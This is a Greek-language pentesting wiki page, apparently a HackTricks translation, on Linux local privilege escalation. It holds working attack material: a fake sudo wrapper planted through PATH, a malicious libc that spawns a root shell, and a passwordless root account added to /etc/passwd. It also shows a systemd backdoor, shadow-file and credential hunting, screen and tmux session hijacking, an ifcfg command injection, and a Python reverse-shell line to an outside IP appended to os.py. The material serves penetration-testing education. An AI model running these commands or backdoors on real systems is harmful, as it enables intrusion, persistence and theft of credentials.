Αν γνωρίζετε ότι ένας **χρήστης συνήθως συνδέεται σε ένα μηχάνημα και χρησιμοποιεί το `sudo`** για ανάθεση προνομίων και έχετε μια κέλυφος μέσα σε αυτό το πλαίσιο χρήστη, μπορείτε **να δημιουργήσετε ένα νέο εκτελέσιμο sudo** που θα εκτελεί τον κώδικά σας ως ριζοχρήστης και στη συνέχεια την εντολή του χρήστη. Στη συνέχεια, **τροποποιήστε το $PATH** του πλαισίου χρήστη (για παράδειγμα προσθέτοντας τη νέα διαδρομή στο .bash\_profile) έτσι ώστε όταν ο χρήστης εκτελεί το sudo, το δικό σας εκτελέσιμο sudo να εκτελείται.

Σημειώστε ότι αν ο χρήστης χρησιμοποιεί διαφορετικό κέλυφος (όχι bash) θα πρέπει να τροποποιήσετε άλλα αρχεία για να προσθέσετε τη νέα διαδρομή. Για παράδειγμα, το [sudo-piggyback](https://github.com/APTy/sudo-piggyback) τροποποιεί τα `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Μπορείτε να βρείτε ένα άλλο παράδειγμα στο [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire\_modules/bashdoor.py)

Ή να εκτελέσετε κάτι παρόμοιο:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Το αρχείο `/etc/ld.so.conf` υποδεικνύει **από πού προέρχονται τα φορτωμένα αρχεία διαμόρφωσης**. Συνήθως, αυτό το αρχείο περιέχει την ακόλουθη διαδρομή: `include /etc/ld.so.conf.d/*.conf`

Αυτό σημαίνει ότι τα αρχεία διαμόρφωσης από `/etc/ld.so.conf.d/*.conf` θα διαβαστούν. Αυτά τα αρχεία διαμόρφωσης **δείχνουν σε άλλους φακέλους** όπου θα **ψάξουν** για **βιβλιοθήκες**. Για παράδειγμα, το περιεχόμενο του `/etc/ld.so.conf.d/libc.conf` είναι `/usr/local/lib`. **Αυτό σημαίνει ότι το σύστημα θα αναζητήσει βιβλιοθήκες μέσα στον φάκελο `/usr/local/lib`**.

Αν για κάποιο λόγο **ένας χρήστης έχει δικαιώματα εγγραφής** σε οποιαδήποτε από τις διαδρομές που υποδεικνύονται: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, οποιοδήποτε αρχείο μέσα στο `/etc/ld.so.conf.d/` ή οποιοδήποτε φάκελο μέσα στο αρχείο διαμόρφωσης μέσα στο `/etc/ld.so.conf.d/*.conf`, μπορεί να καταφέρει να αναβαθμίσει τα προνόμιά του.\
Ρίξτε μια ματιά σε **πώς να εκμεταλλευτείτε αυτήν την κακή διαμόρφωση** στην ακόλουθη σελίδα:

{% content-ref url="ld.so.conf-example.md" %}
[ld.so.conf-example.md](ld.so.conf-example.md)
{% endcontent-ref %}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Αντιγράφοντας τη βιβλιοθήκη στο `/var/tmp/flag15/`, θα χρησιμοποιηθεί από το πρόγραμμα σε αυτή τη θέση όπως ορίζεται στη μεταβλητή `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Στη συνέχεια δημιούργησε μια κακόβουλη βιβλιοθήκη στο `/var/tmp` με `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Δυνατότητες

Οι δυνατότητες του Linux παρέχουν ένα **υποσύνολο των διαθέσιμων προνομίων ρίζας σε ένα διεργασία**. Αυτό διαχωρίζει αποτελεσματικά τα προνόμια ρίζας σε μικρότερες και διακριτικές μονάδες. Κάθε μια από αυτές τις μονάδες μπορεί να χορηγηθεί ανεξάρτητα σε διεργασίες. Με αυτόν τον τρόπο, το πλήρες σύνολο των προνομίων μειώνεται, μειώνοντας τους κινδύνους εκμετάλλευσης.\
Διαβάστε την ακόλουθη σελίδα για να **μάθετε περισσότερα σχετικά με τις δυνατότητες και πώς να τις καταχραστείτε**:

{% content-ref url="linux-capabilities.md" %}
[linux-capabilities.md](linux-capabilities.md)
{% endcontent-ref %}

## Δικαιώματα καταλόγου

Σε έναν κατάλογο, το **bit για "εκτέλεση"** υποδηλώνει ότι ο χρήστης που επηρεάζεται μπορεί να κάνει "**cd**" στον φάκελο.\
Το **bit "ανάγνωσης"** υποδηλώνει ότι ο χρήστης μπορεί να **λίσταρει** τα **αρχεία**, και το **bit "εγγραφής"** υποδηλώνει ότι ο χρήστης μπορεί να **διαγράψει** και **δημιουργήσει** νέα **αρχεία**.

## ACLs

Οι Λίστες Ελέγχου Πρόσβασης (ACLs) αντιπροσωπεύουν το δευτερεύον επίπεδο των δικαιωμάτων κατά βούληση, ικανά να **αντικαταστήσουν τα παραδοσιακά δικαιώματα ugo/rwx**. Αυτά τα δικαιώματα ενισχύουν τον έλεγχο της πρόσβασης σε αρχεία ή καταλόγους επιτρέποντας ή απαγορεύοντας δικαιώματα σε συγκεκριμένους χρήστες που δεν είναι ιδιοκτήτες ή μέλη της ομάδας. Αυτό το επίπεδο **λεπτομέρειας εξασφαλίζει πιο ακριβή διαχείριση πρόσβασης**. Περισσότερες λεπτομέρειες μπορούν να βρεθούν [**εδώ**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Δώστε** στον χρήστη "kali" δικαιώματα ανάγνωσης και εγγραφής σε ένα αρχείο:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Λήψη** αρχείων με συγκεκριμένα ACLs από το σύστημα:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
## Άνοιγμα κελιών (shell sessions)

Σε **παλιότερες εκδόσεις** ενδέχεται να **καταλάβετε** κάποια **κελί** συνεδρία ενός διαφορετικού χρήστη (**root**).\
Σε **νεότερες εκδόσεις** θα μπορείτε να **συνδεθείτε** μόνο σε κελιές οθόνης του **δικού σας χρήστη**. Ωστόσο, ενδέχεται να βρείτε **ενδιαφέρουσες πληροφορίες μέσα στη συνεδρία**.

### Κατάληψη κελιών οθόνης

**Λίστα με τις συνεδρίες οθόνης**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions
```
**Συνδεθείτε σε μια συνεδρία**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## Απαγωγή συνεδριών tmux

Αυτό ήταν ένα πρόβλημα με **παλιές εκδόσεις tmux**. Δεν μπόρεσα να απαγάγω μια συνεδρία tmux (v2.1) που δημιουργήθηκε από το ριζικό χρήστη ως μη προνομιούχος χρήστη.

**Λίστα συνεδριών tmux**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../.gitbook/assets/image (834).png>)

**Σύνδεση σε μια συνεδρία**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Ελέγξτε το **Valentine box από το HTB** για ένα παράδειγμα.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Όλα τα κλειδιά SSL και SSH που δημιουργήθηκαν σε συστήματα βασισμένα σε Debian (Ubuntu, Kubuntu, κλπ) μεταξύ Σεπτεμβρίου 2006 και 13 Μαΐου 2008 μπορεί να επηρεαστούν από αυτό το σφάλμα.\
Αυτό το σφάλμα προκαλείται κατά τη δημιουργία ενός νέου κλειδιού ssh σε αυτά τα λειτουργικά συστήματα, καθώς **ήταν δυνατές μόνο 32.768 παραλλαγές**. Αυτό σημαίνει ότι όλες οι πιθανότητες μπορούν να υπολογιστούν και **έχοντας το δημόσιο κλειδί ssh μπορείτε να αναζητήσετε το αντίστοιχο ιδιωτικό κλειδί**. Μπορείτε να βρείτε τις υπολογισμένες πιθανότητες εδώ: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Ενδιαφέρουσες τιμές ρύθμισης

* **PasswordAuthentication:** Καθορίζει εάν επιτρέπεται η ελέγχει κωδικού πρόσβασης. Η προεπιλογή είναι `no`.
* **PubkeyAuthentication:** Καθορίζει εάν επιτρέπεται η ελέγχει με δημόσιο κλειδί. Η προεπιλογή είναι `yes`.
* **PermitEmptyPasswords**: Όταν επιτρέπεται ο έλεγχος κωδικού πρόσβασης, καθορίζει εάν ο διακομιστής επιτρέπει τη σύνδεση σε λογαριασμούς με κενές συμβολοσειρές κωδικού πρόσβασης. Η προεπιλογή είναι `no`.

### PermitRootLogin

Καθορίζει εάν ο ριζικός χρήστης μπορεί να συνδεθεί χρησιμοποιώντας το ssh, η προεπιλογή είναι `no`. Δυνατές τιμές:

* `yes`: ο ριζικός χρήστης μπορεί να συνδεθεί χρησιμοποιώντας κωδικό και ιδιωτικό κλειδί
* `without-password` ή `prohibit-password`: ο ριζικός χρήστης μπορεί να συνδεθεί μόνο με ιδιωτικό κλειδί
* `forced-commands-only`: Ο ριζικός χρήστης μπορεί να συνδεθεί μόνο χρησιμοποιώντας ιδιωτικό κλειδί και εάν ορίζονται οι επιλογές εντολών
* `no` : όχι

### AuthorizedKeysFile

Καθορίζει τα αρχεία που περιέχουν τα δημόσια κλειδιά που μπορούν να χρησιμοποιηθούν για την πιστοποίηση του χρήστη. Μπορεί να περιέχει διακριτικά όπως `%h`, τα οποία θα αντικατασταθούν από τον κατάλογο αρχικού. **Μπορείτε να υποδείξετε απόλυτα μονοπάτια** (ξεκινώντας από `/`) ή **σχετικά μονοπάτια από τον αρχικό κατάλογο του χρήστη**. Για παράδειγμα:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Η διαμόρφωση αυτή θα υποδείξει ότι εάν προσπαθήσετε να συνδεθείτε με το **ιδιωτικό** κλειδί του χρήστη "**testusername**", το ssh θα συγκρίνει το δημόσιο κλειδί του κλειδιού σας με αυτά που βρίσκονται στα `/home/testusername/.ssh/authorized_keys` και `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

Η προώθηση του SSH agent σάς επιτρέπει να **χρησιμοποιείτε τα τοπικά σας κλειδιά SSH αντί να αφήνετε τα κλειδιά** (χωρίς φράσεις κλειδιού!) να κάθονται στο διακομιστή σας. Έτσι, θα μπορείτε να **μεταβείτε** μέσω ssh **σε έναν οικοδεσπότη** και από εκεί **να μεταβείτε σε έναν άλλο** οικοδεσπότη **χρησιμοποιώντας** το **κλειδί** που βρίσκεται στο **αρχικό σας οικοδεσπότη**.

Πρέπει να ορίσετε αυτήν την επιλογή στο `$HOME/.ssh.config` όπως εδώ:
```
Host example.com
ForwardAgent yes
```
Σημείωση: Εάν το `Host` είναι `*`, κάθε φορά που ο χρήστης μεταβαίνει σε διαφορετική μηχανή, αυτή η μηχανή θα μπορεί να έχει πρόσβαση στα κλειδιά (που αποτελεί πρόβλημα ασφαλείας).

Το αρχείο `/etc/ssh_config` μπορεί **να αντικαταστήσει** αυτές τις **επιλογές** και να επιτρέψει ή να απαγορεύσει αυτή τη διαμόρφωση.\
Το αρχείο `/etc/sshd_config` μπορεί **να επιτρέψει** ή **να απαγορεύσει** την προώθηση του ssh-agent με τη λέξη-κλειδί `AllowAgentForwarding` (η προεπιλογή είναι επιτρέπεται).

Εάν ανακαλύψετε ότι η προώθηση του Agent είναι διαμορφωμένη σε ένα περιβάλλον, διαβάστε την ακόλουθη σελίδα καθώς **μπορείτε να την εκμεταλλευτείτε για να αναβαθμίσετε τα προνόμια**:

{% content-ref url="ssh-forward-agent-exploitation.md" %}
[ssh-forward-agent-exploitation.md](ssh-forward-agent-exploitation.md)
{% endcontent-ref %}

## Ενδιαφέροντα Αρχεία

### Αρχεία Προφίλ

Το αρχείο `/etc/profile` και τα αρχεία υπό τον φάκελο `/etc/profile.d/` είναι **σενάρια που εκτελούνται όταν ένας χρήστης εκτελεί ένα νέο κέλυφος**. Επομένως, εάν μπορείτε **να γράψετε ή να τροποποιήσετε οποιοδήποτε από αυτά, μπορείτε να αναβαθμίσετε τα προνόμια**.
```bash
ls -l /etc/profile /etc/profile.d/
```
### Αρχεία Passwd/Shadow

Ανάλογα με το λειτουργικό σύστημα τα αρχεία `/etc/passwd` και `/etc/shadow` μπορεί να χρησιμοποιούν διαφορετική ονομασία ή ενδέχεται να υπάρχει αντίγραφο. Συνεπώς, συνιστάται **να βρείτε όλα αυτά τα αρχεία** και **να ελέγξετε αν μπορείτε να τα διαβάσετε** για να δείτε **αν υπάρχουν κρυπτογραφημένες τιμές (hashes)** μέσα στα αρχεία:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
Σε ορισμένες περιπτώσεις μπορείτε να βρείτε **κατακερματισμένους κωδικούς πρόσβασης** μέσα στο αρχείο `/etc/passwd` (ή ισοδύναμό του)
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Εγγράψιμο /etc/passwd

Πρώτα, δημιουργήστε έναν κωδικό πρόσβασης με έναν από τους παρακάτω εντολές.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Στη συνέχεια προσθέστε τον χρήστη `hacker` και προσθέστε τον κωδικό πρόσβασης που δημιουργήθηκε.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
Π.χ .: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Μπορείτε τώρα να χρησιμοποιήσετε την εντολή `su` με `hacker:hacker`

Εναλλακτικά, μπορείτε να χρησιμοποιήσετε τις παρακάτω γραμμές για να προσθέσετε ένα ψεύτικο χρήστη χωρίς κωδικό πρόσβασης.\
ΠΡΟΕΙΔΟΠΟΙΗΣΗ: ενδέχεται να υποβαθμίσετε την τρέχουσα ασφάλεια της συσκευής.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
**ΣΗΜΕΙΩΣΗ:** Στις πλατφόρμες BSD το `/etc/passwd` βρίσκεται στο `/etc/pwd.db` και `/etc/master.passwd`, επίσης το `/etc/shadow` μετονομάζεται σε `/etc/spwd.db`.

Θα πρέπει να ελέγξετε αν μπορείτε **να γράψετε σε κάποια ευαίσθητα αρχεία**. Για παράδειγμα, μπορείτε να γράψετε σε κάποιο **αρχείο ρύθμισης υπηρεσίας**;
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Για παράδειγμα, αν η μηχανή εκτελεί έναν διακομιστή **tomcat** και μπορείτε να **τροποποιήσετε το αρχείο ρύθμισης υπηρεσίας Tomcat μέσα στο /etc/systemd/**, τότε μπορείτε να τροποποιήσετε τις γραμμές:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Το backdoor σας θα εκτελεστεί την επόμενη φορά που θα εκκινηθεί το tomcat.

### Έλεγχος Φακέλων

Οι παρακάτω φάκελοι μπορεί να περιέχουν αντίγραφα ασφαλείας ή ενδιαφέρουσες πληροφορίες: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Πιθανόν να μην μπορείτε να διαβάσετε τον τελευταίο, αλλά δοκιμάστε)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Παράξενες τοποθεσίες/Αρχεία που ανήκουν
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Τροποποιημένα αρχεία στα τελευταία λεπτά
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Αρχεία βάσης δεδομένων Sqlite
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_ιστορικό, .sudo\_as\_admin\_επιτυχημένο, προφίλ, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml αρχεία
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Κρυμμένα αρχεία
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Σενάρια/Εκτελέσιμα στο PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Αρχεία Ιστού**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Αντίγραφα Ασφαλείας**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Γνωστά αρχεία που περιέχουν κωδικούς πρόσβασης

Διαβάστε τον κώδικα του [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), αναζητά **πολλά δυνητικά αρχεία που θα μπορούσαν να περιέχουν κωδικούς πρόσβασης**.\
**Ένα άλλο ενδιαφέρον εργαλείο** που μπορείτε να χρησιμοποιήσετε για αυτό είναι το: [**LaZagne**](https://github.com/AlessandroZ/LaZagne) το οποίο είναι μια εφαρμογή ανοικτού κώδικα που χρησιμοποιείται για την ανάκτηση πολλών κωδικών που αποθηκεύονται σε έναν τοπικό υπολογιστή για Windows, Linux & Mac.

### Αρχεία καταγραφής

Αν μπορείτε να διαβάσετε τα αρχεία καταγραφής, μπορείτε να βρείτε **ενδιαφέρουσες/εμπιστευτικές πληροφορίες μέσα σε αυτά**. Όσο πιο παράξενο είναι το αρχείο καταγραφής, τόσο πιο ενδιαφέρον θα είναι (πιθανόν).\
Επίσης, κάποια "**κακά**" ρυθμισμένα (με backdoor?) **αρχεία καταγραφής ελέγχου** μπορεί να σας επιτρέψουν να **καταγράψετε κωδικούς πρόσβασης** μέσα σε αυτά όπως εξηγείται σε αυτήν την ανάρτηση: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Για να **διαβάσετε τα αρχεία καταγραφής του συστήματος** η ομάδα [**adm**](interesting-groups-linux-pe/#adm-group) θα είναι πολύ χρήσιμη.

### Αρχεία κελύφους
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Γενική Αναζήτηση/Regex Διαπιστεύσεων

Θα πρέπει επίσης να ελέγξετε αρχεία που περιέχουν τη λέξη "**password**" στο **όνομά** τους ή μέσα στο **περιεχόμενο**, καθώς επίσης να ελέγξετε για IPs και emails μέσα σε logs, ή hashes regexps.\
Δε θα αναφέρω εδώ πως να κάνετε όλα αυτά, αλλά αν σας ενδιαφέρει μπορείτε να ελέγξετε τους τελευταίους ελέγχους που εκτελεί το [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Εγγράψιμα αρχεία

### Απάτη Βιβλιοθήκης Python

Αν γνωρίζετε από **πού** θα εκτελεστεί ένα script python και **μπορείτε να γράψετε μέσα** σε αυτόν τον φάκελο ή μπορείτε να **τροποποιήσετε τις βιβλιοθήκες python**, μπορείτε να τροποποιήσετε τη βιβλιοθήκη του λειτουργικού συστήματος και να την προσθέσετε backdoor (αν μπορείτε να γράψετε εκεί που θα εκτελεστεί το script python, αντιγράψτε και επικολλήστε τη βιβλιοθήκη os.py).

Για να **προσθέσετε backdoor στη βιβλιοθήκη**, απλά προσθέστε στο τέλος της βιβλιοθήκης os.py την ακόλουθη γραμμή (αλλάξτε την IP και τη θύρα):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Εκμετάλλευση ευπάθειας στο Logrotate

Μια ευπάθεια στο `logrotate` επιτρέπει σε χρήστες με **δικαιώματα εγγραφής** σε ένα αρχείο καταγραφής ή τους γονεϊκούς φακέλους του να αποκτήσουν πιθανά αυξημένα προνόμια. Αυτό συμβαίνει επειδή το `logrotate`, που συχνά τρέχει ως **root**, μπορεί να τροποποιηθεί ώστε να εκτελέσει τυχαία αρχεία, ειδικά σε φακέλους όπως ο _**/etc/bash\_completion.d/**_. Είναι σημαντικό να ελέγχετε τα δικαιώματα όχι μόνο στο _/var/log_ αλλά και σε οποιονδήποτε φάκελο εφαρμόζεται η περιστροφή των καταγραφών.

{% hint style="info" %}
Αυτή η ευπάθεια επηρεάζει την έκδοση `3.18.0` και παλαιότερες του `logrotate`
{% endhint %}

Περισσότερες λεπτομέρειες σχετικά με την ευπάθεια μπορούν να βρεθούν σε αυτήν τη σελίδα: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Μπορείτε να εκμεταλλευτείτε αυτήν την ευπάθεια με το [**logrotten**](https://github.com/whotwagner/logrotten).

Αυτή η ευπάθεια είναι πολύ παρόμοια με το [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(καταγραφές nginx)**, οπότε όποτε ανακαλύπτετε ότι μπορείτε να τροποποιήσετε καταγραφές, ελέγξτε ποιος διαχειρίζεται αυτές τις καταγραφές και ελέγξτε αν μπορείτε να αναβαθμίσετε τα προνόμια αντικαθιστώντας τις καταγραφές με συμβολικούς συνδέσμους.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Αναφορά ευπαθειών:** [**https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist\_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f)

Εάν, για οποιονδήποτε λόγο, ένας χρήστης μπορεί να **εγγράψει** ένα σενάριο `ifcf-<whatever>` στο _/etc/sysconfig/network-scripts_ **ή** μπορεί να **προσαρμόσει** ένα υπάρχον, τότε το **σύστημά σας είναι στοχευμένο**.

Τα σενάρια δικτύου, όπως το _ifcg-eth0_ για παράδειγμα, χρησιμοποιούνται για συνδέσεις δικτύου. Μοιάζουν ακριβώς με αρχεία .INI. Ωστόσο, στο Linux \~φορτώνονται\~ από το Network Manager (dispatcher.d).

Στην περίπτωσή μου, το χαρακτηριστικό `NAME=` σε αυτά τα σενάρια δικτύου δεν χειρίζεται σωστά. Εάν έχετε **κενό/κενό διάστημα στο όνομα, το σύστημα προσπαθεί να εκτελέσει το τμήμα μετά το κενό/κενό διάστημα**. Αυτό σημαίνει ότι **ό,τι ακολουθεί μετά το πρώτο κενό/κενό διάστημα εκτελείται ως root**.

Για παράδειγμα: _/etc/sysconfig/network-scripts/ifcfg-1337_
```bash
NAME=Network /bin/id
ONBOOT=yes
DEVICE=eth0
```
### **init, init.d, systemd, and rc.d**

Ο κατάλογος `/etc/init.d` είναι η **έδρα** των **σεναρίων** για το System V init (SysVinit), το **κλασικό σύστημα διαχείρισης υπηρεσιών του Linux**. Περιλαμβάνει σενάρια για `εκκίνηση`, `διακοπή`, `επανεκκίνηση` και μερικές φορές `επαναφόρτωση` υπηρεσιών. Αυτά μπορούν να εκτελεστούν απευθείας ή μέσω συμβολικών συνδέσμων που βρίσκονται στον κατάλογο `/etc/rc?.d/`. Ένα εναλλακτικό μονοπάτι σε συστήματα Redhat είναι το `/etc/rc.d/init.d`.

Από την άλλη, το `/etc/init` συσχετίζεται με το **Upstart**, ένα νεότερο **σύστημα διαχείρισης υπηρεσιών** που εισήχθη από το Ubuntu, χρησιμοποιώντας αρχεία ρυθμίσεων για εργασίες διαχείρισης υπηρεσιών. Παρά τη μετάβαση στο Upstart, τα σενάρια SysVinit εξακολουθούν να χρησιμοποιούνται σε συνδυασμό με τις διαμορφώσεις Upstart λόγω μιας στρώσης συμβατότητας στο Upstart.

Το **systemd** εμφανίζεται ως ένας σύγχρονος διαχειριστής εκκίνησης και υπηρεσιών, προσφέροντας προηγμένες λειτουργίες όπως εκκίνηση δαίμονα κατόπιν αιτήματος, διαχείριση αυτόματης τοποθέτησης και στιγμιότυπα κατάστασης συστήματος. Οργανώνει τα αρχεία στον κατάλογο `/usr/lib/systemd/` για πακέτα διανομής και στον κατάλογο `/etc/systemd/system/` για τροποποιήσεις διαχειριστή, βελτιώνοντας τη διαδικασία διαχείρισης του συστήματος.

## Άλλα Κόλπα

### Εξέλιξη προνομίων NFS

{% content-ref url="nfs-no_root_squash-misconfiguration-pe.md" %}
[nfs-no\_root\_squash-misconfiguration-pe.md](nfs-no\_root\_squash-misconfiguration-pe.md)
{% endcontent-ref %}

### Απόδραση από περιορισμένες κελύφη

{% content-ref url="escaping-from-limited-bash.md" %}
[escaping-from-limited-bash.md](escaping-from-limited-bash.md)
{% endcontent-ref %}

### Cisco - vmanage

{% content-ref url="cisco-vmanage.md" %}
[cisco-vmanage.md](cisco-vmanage.md)
{% endcontent-ref %}

## Προστασίες Ασφάλειας Πυρήνα

* [https://github.com/a13xp0p0v/kconfig-hardened-check](https://github.com/a13xp0p0v/kconfig-hardened-check)
* [https://github.com/a13xp0p0v/linux-kernel-defence-map](https://github.com/a13xp0p0v/linux-kernel-defence-map)

## Περισσότερη βοήθεια

[Στατικά δυαδικά αρχεία impacket](https://github.com/ropnop/impacket\_static\_binaries)

## Εργαλεία Εξέλιξης Προνομίων Linux/Unix

### **Καλύτερο εργαλείο για εύρεση διανυσματικών εξέλιξης τοπικών προνομίων στο Linux:** [**LinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS)

**LinEnum**: [https://github.com/rebootuser/LinEnum](https://github.com/rebootuser/LinEnum)(-t option)\
**Enumy**: [https://github.com/luke-goddard/enumy](https://github.com/luke-goddard/enumy)\
**Unix Privesc Check:** [http://pentestmonkey.net/tools/audit/unix-privesc-check](http://pentestmonkey.net/tools/audit/unix-privesc-check)\
**Linux Priv Checker:** [www.securitysift.com/download/linuxprivchecker.py](http://www.securitysift.com/download/linuxprivchecker.py)\
